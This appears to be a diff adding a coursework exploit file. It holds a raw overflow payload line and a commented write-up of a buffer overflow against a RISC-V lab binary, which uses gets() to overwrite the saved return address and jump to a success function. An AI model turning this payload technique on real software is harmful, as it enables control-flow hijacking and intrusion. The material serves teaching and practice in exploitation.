@@ -1,0 +1,37 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAË
+
+
+
+
+# Q3 Part B - Buffer Overflow Exploit Write-Up
+#
+# Goal: Make ./target_lokesh14-06 < payload print output containing "You have passed!"
+#
+# 1. Identify binary type:
+#    file target_lokesh14-06
+#    # ELF 64-bit, RISC-V, statically linked, not stripped, -no-pie -fno-PIE
+#
+# 2. Analyze symbols and disassembly:
+#    readelf -s target_lokesh14-06 | grep -i "pass\|gets\|buf\|main"
+#    riscv64-linux-gnu-objdump -d target_lokesh14-06 > disasm.txt
+#    # Found gets() used on a 304-byte buffer, and .pass at 0x104e8 (prints success)
+#
+# 3. Stack layout:
+#    - gets() writes to buffer[304] on stack
+#    - 8 bytes after buffer: saved s0
+#    - 8 bytes after that: saved ra (return address)
+#    - To hijack control flow, overwrite saved ra with address of .pass (0x104e8)
+#    - Offset: 304 (buffer) + 8 (s0) = 312 bytes to ra
+#
+# 4. Payload construction:
+#    - 312 bytes of padding (A's)
+#    - 8 bytes: little-endian address 0x104e8
+#    - Python: b'A'*312 + struct.pack('<Q', 0x104e8)
+#    - Write as a binary file, not text
+#
+# 5. Run and verify:
+#    ./target_lokesh14-06 < payload
+#    # Output contains "You have passed!" (may segfault after, that's OK)
+#
+# Why it works: gets() overflows the buffer and overwrites the return address, so the function returns to .pass, which prints the success message.
+
